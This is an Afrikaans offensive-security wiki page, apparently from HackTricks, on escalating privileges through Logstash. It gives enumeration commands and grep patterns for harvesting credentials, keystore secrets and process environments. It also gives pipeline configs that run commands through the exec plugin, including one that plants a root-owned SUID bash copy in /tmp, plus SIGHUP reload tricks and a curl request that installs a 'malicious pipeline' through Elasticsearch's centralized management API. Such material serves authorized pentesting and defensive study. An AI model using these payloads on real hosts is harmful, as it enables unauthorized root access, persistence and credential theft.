# Logstash Voorregte-eskalasie

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash word gebruik om logs deur ’n stelsel bekend as **pyplyne** te **versamel, te transformeer en te versprei**. Hierdie pyplyne bestaan uit **invoer**-, **filter**- en **uitvoer**-stadiums.<sup>[[4]](#references)</sup> ’n Interessante aspek ontstaan wanneer Logstash op ’n gekompromitteerde masjien werk.

### Pyplynkonfigurasie

Met Debian- en RPM-pakketinstallasies word pyplyne opgestel via **/etc/logstash/pipelines.yml**, wat die liggings van die pyplynkonfigurasies lys; ander verspreidings plaas `pipelines.yml` in die Logstash `path.settings`-gids.<sup>[[5]](#references)[[6]](#references)</sup>

```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
  path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
  path.config: "/usr/share/logstash/pipeline/1*.conf"
  pipeline.workers: 6
```

Hierdie lêer wys waar die **.conf**-lêers met pyplyngkonfigurasies geleë is. Wanneer ’n **Elasticsearch output** gebruik word, inspekteer die `user`/`password`-, `cloud_auth`- of `api_key`-instellings; die rekening se effektiewe voorregte hang van Elasticsearch af. ’n `path.config`-glob laai elke lêer wat vir daardie pyplyn ooreenstem.<sup>[[6]](#references)[[7]](#references)[[11]](#references)</sup>

As Logstash met `-f <directory>` in plaas van `pipelines.yml` begin word, geniet `-f` voorkeur en **word alle lêers in daardie gids in leksikografiese volgorde saamgevoeg en as ’n enkele konfigurasie ontleed**.<sup>[[6]](#references)[[7]](#references)</sup> Dit skep 2 offensiewe implikasies:

- ’n Lêer wat neergesit word, soos `000-input.conf` of `zzz-output.conf`, kan verander hoe die finale pyplyn saamgestel word
- ’n Misvormde lêer kan veroorsaak dat die saamgevoegde konfigurasie nie validering slaag nie; tydens herlaai behou Logstash die vorige pyplyn, dus valideer payloads voordat jy op outomatiese herlaai staatmaak.<sup>[[1]](#references)</sup>

### Vinnige Enumerasie op ’n Geïnkromitteerde Gasheer

Op ’n masjien waarop Logstash geïnstalleer is, inspekteer vinnig:

```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```

Kontroleer ook of die plaaslike monitering-API bereikbaar is. By verstek bind dit aan **127.0.0.1:9600**, wat gewoonlik genoeg is nadat jy op die host geland het.<sup>[[8]](#references)</sup>

```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```

Hierdie eindpunte stel pipeline-ID's en -instellings, looptydmetrieke en tellers vir die sukses/mislukking van konfigurasieherlaai bloot, wat help bevestig of 'n verandering aanvaar is.<sup>[[8]](#references)[[17]](#references)[[18]](#references)</sup>

As 'n herwinde geloofsbrief op **Elasticsearch** gerig is, kyk na [hierdie ander bladsy oor Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Lêerinvoer wat 'n dinamiese opdraguitvoer voed

'n Pipeline-konfigurasie kan leesalleen vir die huidige gebruiker wees terwyl sy [lêerinvoer](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-file) 'n pad dophou waarop die gebruiker kan skryf. Volg die gelaaide pipeline vanaf daardie invoer deur enige [Grok-veldvaslegging](https://www.elastic.co/docs/reference/logstash/plugins/plugins-filters-grok) tot by 'n [exec-uitvoer](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-exec). Die exec-uitvoer stuur sy `command` deur 'n shell en vervang `%{field}`-waardes sonder om shell-metakarakters te suiwer. 'n Skryfbare invoerpad bied slegs 'n moontlikheid vir voorregteverhoging as die lopende diens 'n hoër identiteit het, die gebruiker se lêer werklik die dopgehoude invoer kan bereik, die filters en uitvoervoorwaardes die inhoud daarvan na die opdragveld stuur, en daardie uitvoerinprop geïnstalleer en aktief is. Gaan die soek-/skryftoestemmings van gidse, die nasporingstoestand van die lêerinvoer en die effektiewe diensrekening afsonderlik na; moenie tydens passiewe enumerasie 'n toetsgebeurtenis skryf of die uitvoer aanroep nie.

### Voorregteverhoging via skryfbare pipelines

Om voorregteverhoging te probeer, identifiseer eers die gebruiker waaronder die Logstash-diens werklik loop; moenie aanvaar dat dit root of die **logstash**-gebruiker is nie. Maak seker dat jy aan **een** van hierdie kriteria voldoen:

- Het **skryftoegang** tot 'n pipeline-**.conf**-lêer **of**
- Die **/etc/logstash/pipelines.yml**-lêer gebruik 'n jokerteken, en jy kan na die teikengids skryf.<sup>[[6]](#references)[[7]](#references)</sup>

Daarbenewens moet **een** van hierdie voorwaardes vervul wees:

- Jy kan die Logstash-diens herbegin **of**
- Die instelling **config.reload.automatic: true** is in die **/etc/logstash/logstash.yml**-lêer gestel.<sup>[[1]](#references)[[15]](#references)</sup>

As die konfigurasie 'n jokerteken bevat, kan die skep van 'n lêer wat by hierdie jokerteken pas, opdraguitvoering moontlik maak.<sup>[[7]](#references)[[9]](#references)</sup> Byvoorbeeld:

```bash
input {
  exec {
    command => "whoami"
    interval => 120
  }
}

output {
  file {
    path => "/tmp/output.log"
    codec => rubydebug
  }
}
```

Hier bepaal **interval** die uitvoeringsfrekwensie in sekondes. In die gegewe voorbeeld word die **whoami**-opdrag elke 120 sekondes uitgevoer, met die uitvoer na **/tmp/output.log** gestuur.<sup>[[9]](#references)</sup>

Met **config.reload.automatic: true** in **/etc/logstash/logstash.yml** sal Logstash nuwe of gewysigde pipeline-konfigurasies outomaties opspoor en toepas sonder dat dit herbegin hoef te word.<sup>[[1]](#references)[[15]](#references)</sup> As daar geen jokerteken is nie, kan bestaande konfigurasies steeds gewysig word, maar wees versigtig om ontwrigtings te voorkom.

### Meer betroubare pipeline-payloads

Die `exec`-invoegtoepassing werk steeds in huidige weergawes en vereis óf ’n `interval` óf ’n `schedule`. Dit voer uit deur die Logstash-JVM te **fork**, so as daar min geheue beskikbaar is, kan jou payload met `ENOMEM` misluk in plaas daarvan om onopsigtelik te loop.<sup>[[9]](#references)</sup>

Wanneer die diens genoeg voorregte het om ’n SUID-lêer wat deur root besit word, te skep, is ’n praktiese privilege-escalation-payload een wat ’n blywende artefak agterlaat:

```bash
input {
  exec {
    command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
    interval => 300
  }
}
output {
  null {}
}
```

As jy nie die regte het om te herbegin nie, maar ’n sein na die proses kan stuur, ondersteun Logstash ook ’n herlaai wat deur **SIGHUP** geaktiveer word op Unix-agtige stelsels:<sup>[[1]](#references)</sup>

```bash
kill -SIGHUP $(pgrep -f logstash)
```

Wees bewus daarvan dat nie elke plugin herlaaivriendelik is nie. Die **stdin**-invoer verhoed byvoorbeeld outomatiese herlaai, moet dus nie aanvaar dat `config.reload.automatic` altyd jou veranderinge sal optel nie.<sup>[[1]](#references)</sup>

### Geheimenisse uit Logstash steel

Voordat jy net op kode-uitvoering fokus, oes die data in wat Logstash reeds kan bereik:

- Geloofsbriewe kan in `elasticsearch {}`-uitsette, `http_poller`-URL's/-instellings, JDBC-invoere of wolkverwante instellings voorkom; hierdie plugins stel geloofsbriefvelde bloot wat die moeite werd is om na te soek.<sup>[[11]](#references)[[12]](#references)[[13]](#references)</sup>
- Veilige instellings kan in **`/etc/logstash/logstash.keystore`** of 'n ander `path.settings`-gids wees.<sup>[[5]](#references)[[10]](#references)</sup>
- Die keystore-wagwoord kan via **`LOGSTASH_KEYSTORE_PASS`** verskaf word, en RPM/DEB-installasies laai diensomgewingsveranderlikes vanaf **`/etc/sysconfig/logstash`**.<sup>[[10]](#references)</sup>
- Omgewingsveranderlike-uitbreiding met `${VAR}` word tydens Logstash se opstart opgelos, dus is dit die moeite werd om die diensomgewing te inspekteer.<sup>[[14]](#references)</sup>

Nuttige kontroles:

```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```

Dit is ook die moeite werd om na te gaan, want **CVE-2023-46672** het getoon dat Logstash onder spesifieke omstandighede sensitiewe inligting in sy logs aangeteken het, insluitend geheime wat in sy keystore gestoor is en waarna daar in konfigurasie verwys is; hersien ou Logstash-logs en `journald`-inskrywings as daardie omstandighede moontlik van toepassing is.<sup>[[3]](#references)</sup>

### Misbruik van gesentraliseerde Pipeline-bestuur

In sommige omgewings maak die gasheer glad nie op plaaslike `.conf`-lêers staat nie. As **`xpack.management.enabled: true`** opgestel is, kan Logstash pipelines wat sentraal deur Elasticsearch/Kibana bestuur word, oplaai, en nadat hierdie modus geaktiveer is, is plaaslike pipeline-konfigurasies nie meer die bron van waarheid nie.<sup>[[2]](#references)</sup>

Dit beteken 'n ander aanvalspad:

1. Herwin Elastic-aanmeldbesonderhede uit plaaslike Logstash-instellings, die keystore of logs.<sup>[[3]](#references)[[10]](#references)</sup>
2. Bevestig of die rekening die cluster-voorreg **`manage_logstash_pipelines`** het.<sup>[[16]](#references)</sup>
3. Skep of vervang 'n sentraal bestuurde pipeline sodat die Logstash-gasheer jou payload tydens sy volgende poll-interval uitvoer.<sup>[[2]](#references)[[16]](#references)</sup>

Die Elasticsearch-API wat vir hierdie funksie gebruik word, is:<sup>[[16]](#references)</sup>

```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
  -H 'Content-Type: application/json' \
  -u user:password \
  -d '{
    "description": "malicious pipeline",
    "last_modified": "2026-01-02T02:50:51.250Z",
    "username": "user",
    "pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
    "pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
    "pipeline_settings": {
      "pipeline.workers": 1,
      "pipeline.batch.size": 1,
      "pipeline.batch.delay": 50,
      "queue.type": "memory",
      "queue.max_bytes": "1gb",
      "queue.checkpoint.writes": 1024
    }
  }'
```

Dit is veral nuttig wanneer plaaslike lêers leesalleen is, maar Logstash reeds geregistreer is om pyplyne op afstand te gaan haal.<sup>[[2]](#references)[[16]](#references)</sup>

## References

- [1] [Elastic Docs: Herlaai die konfigurasielêer](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs: Stel gesentraliseerde pyplynbestuur op](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Logstash 8.11.1-sekuriteitsopdatering (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)
- [4] [Elastic Docs: Skep 'n Logstash-pyplyn](https://www.elastic.co/docs/reference/logstash/creating-logstash-pipeline)
- [5] [Elastic Docs: Logstash-gidsuitleg](https://www.elastic.co/docs/reference/logstash/dir-layout)
- [6] [Elastic Docs: Veelvuldige pyplyne](https://www.elastic.co/docs/reference/logstash/multiple-pipelines)
- [7] [Elastic Docs: Voer Logstash vanaf die opdragreël uit](https://www.elastic.co/docs/reference/logstash/running-logstash-command-line)
- [8] [Elastic Docs: Monitor Logstash met API's](https://www.elastic.co/docs/reference/logstash/monitoring-logstash)
- [9] [Elastic Docs: Exec-invoerinprop](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-exec)
- [10] [Elastic Docs: Secrets-keystore vir veilige instellings](https://www.elastic.co/docs/reference/logstash/keystore)
- [11] [Elastic Docs: Elasticsearch-uitvoerinprop](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-elasticsearch)
- [12] [Elastic Docs: Http_poller-invoerinprop](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-http_poller)
- [13] [Elastic Docs: Jdbc-invoerinprop](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-jdbc)
- [14] [Elastic Docs: Gebruik omgewingsveranderlikes](https://www.elastic.co/docs/reference/logstash/environment-variables)
- [15] [Elastic Docs: logstash.yml](https://www.elastic.co/docs/reference/logstash/logstash-settings-file)
- [16] [Elasticsearch API: Skep of werk 'n Logstash-pyplyn by](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-logstash-put-pipeline)
- [17] [Logstash API: Kry instellings vir pyplyne](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodeinfopipelines)
- [18] [Logstash API: Kry statistieke vir pyplyne](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodestatspipelines)
{{#include ../../banners/hacktricks-training.md}}
